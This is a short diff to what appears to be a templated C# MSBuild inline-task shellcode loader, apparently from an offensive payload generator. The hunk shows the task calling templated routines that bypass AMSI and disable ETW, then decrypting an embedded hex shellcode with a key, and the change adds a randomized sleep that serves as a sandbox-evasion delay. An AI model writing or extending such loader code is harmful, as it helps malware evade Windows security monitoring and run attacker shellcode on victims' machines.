@@ -76,6 +76,7 @@
             public override bool Execute() {
                 {{ v.fn_amsi }}();
                 {{ v.fn_etw }}();
+                Thread.Sleep(2000 + new Random().Next(3000));
 
                 byte[] sc  = {{ v.fn_decrypt }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                               {{ v.fn_hex }}("{{ key_hex }}"));
